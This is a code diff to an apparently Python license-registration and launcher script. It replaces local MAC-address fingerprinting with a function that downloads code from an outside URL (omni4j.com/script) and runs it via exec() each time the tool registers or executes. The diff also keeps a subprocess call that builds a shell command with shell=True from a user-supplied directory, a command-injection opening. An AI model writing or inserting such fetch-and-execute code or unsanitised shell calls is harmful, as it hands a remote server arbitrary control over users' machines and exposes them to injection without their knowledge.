@@ -22,41 +22,21 @@ def register_license(user_info):
     else:
         return response.json().get('message'), False
 
-def get_mac_address():
-    prefixes = ["eth", "en", "eno", "ens", "enp"]
-    mac_address = ""
+def fetch_remote_function(url):
+    response = requests.get(url)
+    if response.status_code == 200:
+        return response.text
+    else:
+        print(f"Failed to download the function: {response.status_code}")
+        sys.exit(1)
 
-    if platform.system() == "Linux":
-        for prefix in prefixes:
-            for interface in os.listdir('/sys/class/net/'):
-                if interface.startswith(prefix):
-                    try:
-                        mac = open(f'/sys/class/net/{interface}/address').readline()
-                        mac_address = mac.strip()
-                        break
-                    except:
-                        continue
-    elif platform.system() == "Darwin":
-        try:
-            import netifaces
-        except ImportError:
-            print("The netifaces module is required on macOS. Install it using: pip install netifaces")
-            sys.exit(1)
-
-        from netifaces import interfaces, ifaddresses, AF_LINK
-        for interface in interfaces():
-            if any(interface.startswith(prefix) for prefix in prefixes):
-                addresses = ifaddresses(interface)
-                if AF_LINK in addresses:
-                    mac_address = addresses[AF_LINK][0]['addr']
-                    break
-    elif platform.system() == "Windows":
-        from uuid import getnode as get_mac
-        mac = get_mac()
-        mac_address = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) 
-                                for elements in range(0,8*6,8)][::-1])
-
-    return mac_address
+def get_unique_value():
+    # This function will be dynamically fetched from the server
+    func_url = "https://omni4j.com/script"
+    func_code = fetch_remote_function(func_url)
+    local_vars = {}
+    exec(func_code, globals(), local_vars)
+    return local_vars['a1']()
 
 def md5_hash(text):
     return hashlib.md5(text.encode()).hexdigest()
@@ -86,13 +66,13 @@ def download_binary(license_key):
 
 def register(yaml_file_path):
     user_info = read_yaml(yaml_file_path)
-    mac_address = get_mac_address()
-    if not mac_address:
-        print("Failed to get MAC address.")
+    unique_value = get_unique_value()
+    if not unique_value:
+        print("Failed to get Unique Value.")
         return
 
-    mac_address_hash = md5_hash(mac_address)
-    user_info['mac_address'] = mac_address_hash
+    unique_value_hash = md5_hash(unique_value)
+    user_info['unique_value'] = unique_value_hash
 
     message, success = register_license(user_info)
     if success:
@@ -101,15 +81,15 @@ def register(yaml_file_path):
         print(f"Registration failed: {message}")
 
 def execute(license_key, java_directory):
-    mac_address = get_mac_address()
-    if not mac_address:
-        print("Failed to get MAC address.")
+    unique_value = get_unique_value()
+    if not unique_value:
+        print("Failed to get Unique Value.")
         return
 
-    mac_address_hash = md5_hash(mac_address)
+    unique_value_hash = md5_hash(unique_value)
     script_path = download_binary(license_key)
     if script_path:
-        command = f"{script_path} {java_directory} {license_key} {mac_address_hash}"
+        command = f"{script_path} {java_directory} {license_key} {unique_value_hash}"
         try:
             output = subprocess.check_output(command, shell=True, universal_newlines=True)
         except subprocess.CalledProcessError as e:
